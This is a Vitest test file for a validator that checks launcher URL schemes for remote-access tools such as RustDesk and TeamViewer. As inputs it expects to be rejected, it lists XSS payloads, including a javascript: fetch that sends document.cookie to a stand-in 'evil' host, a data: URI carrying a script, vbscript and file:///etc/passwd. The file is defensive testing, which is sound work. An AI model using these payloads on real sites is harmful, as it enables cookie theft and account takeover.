import { describe, it, expect } from 'vitest';
import { isAllowedLauncherScheme } from './remoteAccessLauncherScheme';

describe('isAllowedLauncherScheme', () => {
  it('accepts known-safe remote-access schemes', () => {
    expect(isAllowedLauncherScheme('rustdesk://{id}?password={password}')).toBe(true);
    expect(isAllowedLauncherScheme('teamviewer://{id}')).toBe(true);
    expect(isAllowedLauncherScheme('anydesk://{id}')).toBe(true);
    expect(isAllowedLauncherScheme('splashtop://{id}')).toBe(true);
    expect(isAllowedLauncherScheme('https://acme.example.com/Host#Access///{id}/Join')).toBe(true);
    expect(isAllowedLauncherScheme('http://127.0.0.1:42/{id}')).toBe(true);
    expect(isAllowedLauncherScheme('breeze://connect?id={id}')).toBe(true);
    expect(isAllowedLauncherScheme('bdunn-rustremote://{id}')).toBe(true);
  });

  it('rejects javascript: in any case (stored XSS via partner-admin)', () => {
    expect(isAllowedLauncherScheme('javascript:alert(1)')).toBe(false);
    expect(isAllowedLauncherScheme('JavaScript:alert(1)')).toBe(false);
    expect(isAllowedLauncherScheme('JAVASCRIPT:alert(1)')).toBe(false);
    expect(isAllowedLauncherScheme('javascript:fetch("//evil/?c="+document.cookie+"_{id}")')).toBe(false);
  });

  it('rejects other dangerous schemes', () => {
    expect(isAllowedLauncherScheme('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(isAllowedLauncherScheme('vbscript:msgbox(1)')).toBe(false);
    expect(isAllowedLauncherScheme('file:///etc/passwd')).toBe(false);
    expect(isAllowedLauncherScheme('about:blank')).toBe(false);
    expect(isAllowedLauncherScheme('chrome://settings')).toBe(false);
    expect(isAllowedLauncherScheme('jar:file:///foo!/bar')).toBe(false);
    expect(isAllowedLauncherScheme('blob:https://x/abc')).toBe(false);
    expect(isAllowedLauncherScheme('view-source:https://x')).toBe(false);
    expect(isAllowedLauncherScheme('filesystem:https://x/foo')).toBe(false);
  });

  it('rejects strings with no scheme', () => {
    expect(isAllowedLauncherScheme('')).toBe(false);
    expect(isAllowedLauncherScheme('//acme.example.com/{id}')).toBe(false);
    expect(isAllowedLauncherScheme('{id}')).toBe(false);
    expect(isAllowedLauncherScheme('rustdesk{id}')).toBe(false);
  });
});
